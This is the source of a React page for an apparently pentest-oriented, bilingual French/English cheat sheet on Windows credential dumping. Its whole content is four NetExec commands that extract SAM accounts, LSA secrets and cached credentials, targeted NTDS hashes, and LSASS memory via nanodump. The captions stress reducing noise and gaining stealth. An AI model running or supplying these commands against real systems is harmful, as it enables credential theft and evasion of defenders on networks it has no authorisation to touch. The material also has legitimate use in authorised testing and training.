"use client";

import { useLanguage } from "@/components/LanguageProvider";
import { CheatsheetCommandCard } from "@/components/CheatsheetCommandCard";

export default function WinCredDumpingPage() {
  const { lang } = useLanguage();
  const entries = [
    { cmd: "nxc smb $TARGET -u $USER -p $PASS --sam", why: lang === "fr" ? "Dump des comptes locaux (SAM)." : "Dump local accounts from SAM." },
    { cmd: "nxc smb $TARGET -u $USER -p $PASS --lsa", why: lang === "fr" ? "Extraire secrets LSA et creds cache." : "Extract LSA secrets and cached creds." },
    { cmd: "nxc smb $TARGET -u $USER -p $PASS --ntds --user $TARGET_USER", why: lang === "fr" ? "Dump NTDS ciblé pour limiter le bruit." : "Targeted NTDS dump to reduce noise." },
    { cmd: "nxc smb $TARGET -u $USER -p $PASS -M nanodump", why: lang === "fr" ? "Dump LSASS avec meilleure discrétion que dump classique." : "Dump LSASS with better stealth than classic dump." },
  ];

  return (
    <div className="mx-auto max-w-3xl px-6 py-10 lg:px-10">
      <header className="mb-8 border-b border-border pb-6">
        <p className="mb-2 text-[11px] font-mono uppercase tracking-widest text-primary">Privesc Windows</p>
        <h1 className="text-2xl font-semibold tracking-tight text-foreground sm:text-3xl">Credential Dumping</h1>
      </header>
      <section className="space-y-4">
        {entries.map((item) => <CheatsheetCommandCard key={item.cmd} cmd={item.cmd} why={item.why} lang={lang} />)}
      </section>
    </div>
  );
}
